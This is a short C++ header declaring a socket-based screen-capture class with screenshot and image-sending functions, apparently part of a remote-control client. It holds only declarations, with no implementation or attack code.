#pragma once
#include "Socket.h"


class CImageCapture : public CSocket{
public:
	QWORD			m_qwClientToken;



public:
	CImageCapture(TCP_MODE iTcpMode, QWORD qwClientToken);
	~CImageCapture();

protected:
	VOID OnReceiveWithDec(ITcpClient* pSender, CONNID dwConnID, QWORD qwClientToken, WORD wServiceType, WORD wSocketType, int iCommandID, DWORD dwParentSocketTag, MyBuffer mBuffer);

	EnHandleResult OnClose(ITcpClient* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode);


	static VOID SendImage(LPVOID lParam, PBYTE pbImageData, DWORD dwImageLength);
	static VOID PrintScreen(LPVOID lParam);
};

